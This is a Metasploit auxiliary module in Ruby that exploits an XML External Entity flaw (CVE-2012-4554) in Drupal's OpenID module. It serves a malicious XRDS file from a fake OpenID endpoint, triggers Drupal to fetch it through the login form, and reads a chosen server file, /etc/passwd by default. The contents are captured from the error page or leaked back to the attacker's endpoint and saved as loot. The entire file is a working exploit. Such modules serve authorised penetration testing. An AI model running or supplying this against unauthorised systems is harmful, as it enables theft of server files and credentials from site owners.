##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'


class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HttpServer::HTML

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Drupal OpenID External Entity Injection',
      'Description'    => %q{
        This module abuses a XML External Entity Injection on the OpenID module
        from Drupal. The vulnerability exists on the parsing of a malformed XRDS
        file coming from a malicious OpenID endpoint. This module has been tested
        successfully on Drupal 7.15 with the OpenID module enabled.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Reginaldo Silva', # Vulnerability discovery
          'juan vazquez' # Metasploit module
        ],
      'References'     =>
        [
          [ 'CVE', '2012-4554' ],
          [ 'OSVDB', '86429' ],
          [ 'BID', '56103' ],
          [ 'URL', 'http://drupalcode.org/project/drupal.git/commit/b912710' ],
          [ 'URL', 'http://www.ubercomp.com/posts/2014-01-16_facebook_remote_code_execution' ]
        ],
      'DisclosureDate' => 'Oct 17 2012'
    ))

    register_options(
      [
        OptString.new('TARGETURI', [ true, "Base Drupal directory path", '/drupal']),
        OptString.new('FILEPATH', [true, "The filepath to read on the server", "/etc/passwd"])
      ], self.class)

  end

  def xrds_file
    xrds = <<-EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ELEMENT URI ANY>
<!ENTITY xxe SYSTEM "file://#{datastore['FILEPATH']}">
]>
<xrds:XRDS xmlns:xrds="xri://$xrds" xmlns="xri://$xrd*($v*2.0)" xmlns:openid="http://openid.net/xmlns/1.0">
<XRD>
  <Status cid="verified"/>
  <ProviderID>xri://@</ProviderID>
  <CanonicalID>http://example.com/user</CanonicalID>
  <Service>
    <Type>http://specs.openid.net/auth/2.0/signon</Type>
    <Type>http://openid.net/srv/ax/1.0</Type>
    <URI>#{get_uri}/#{@prefix}/&xxe;/#{@suffix}</URI>
    <LocalID>http://example.com/xrds</LocalID>
  </Service>
</XRD>
</xrds:XRDS>
EOF
    return xrds
  end

  def primer
    res = send_openid_auth

    if res.nil?
      # nothing to do here...
      service.stop
      return
    end

    unless res.code == 500
      print_warning("#{peer} - Unexpected answer, trying to parse anyway...")
    end

    error_loot = parse_loot(res.body)

    # Check if file was retrieved on the drupal answer
    # Better results, because there isn't URL encoding,
    # plus probably allows to retrieve longer files.
    unless error_loot.blank?
      print_status("#{peer} - File found on the Drupal answer")
      store(error_loot)
      service.stop
      return
    end

    # Check if file was leaked to the fake OpenID endpoint
    # Contents are probably URL encoded, plus probably long
    # files aren't full, but something is something :-)
    unless @loot.blank?
      print_status("#{peer} - File contents leaked through the OpenID request")
      store(@loot)
      service.stop
      return
    end

    # Nothing :( just stop the service
    # so the auxiliary module stops
    service.stop
  end

  def run
    @prefix = Rex::Text.rand_text_alpha(4 + rand(4))
    @suffix = Rex::Text.rand_text_alpha(4 + rand(4))
    exploit
  end

  def on_request_uri(cli, request)
    if request.uri =~ /#{@prefix}/
      vprint_status("Signature found, parsing file...")
      @loot = parse_loot(request.uri)
      return
    end

    print_status("Sending XRDS...")
    send_response_html(cli, xrds_file, { 'Content-Type' => 'application/xrds+xml' })
  end

  def send_openid_auth
    res = send_request_cgi({
      'uri'    => normalize_uri(target_uri.to_s, "/"),
      'method' => 'POST',
      'vars_get' => {
        "q" => "node",
        "destination" => "node"
      },
      'vars_post' => {
        "openid_identifier" => "#{get_uri}",
        "name" => "",
        "pass" => "",
        "form_id" => "user_login_block",
        "op" => "Log in"
      }
    })

    return res
  end

  def store(data)
    path = store_loot("drupal.file", "text/plain", rhost, data, datastore['FILEPATH'])
    print_good("#{peer} - File saved to path: #{path}")
  end

  def parse_loot(data)
    return nil if data.blank?

    # Full file found
    if data =~ /#{@prefix}\/(.*)\/#{@suffix}/m
      return $1
    end

    # Partial file found
    if data =~ /#{@prefix}\/(.*)/m
      return $1
    end

    return nil
  end

end

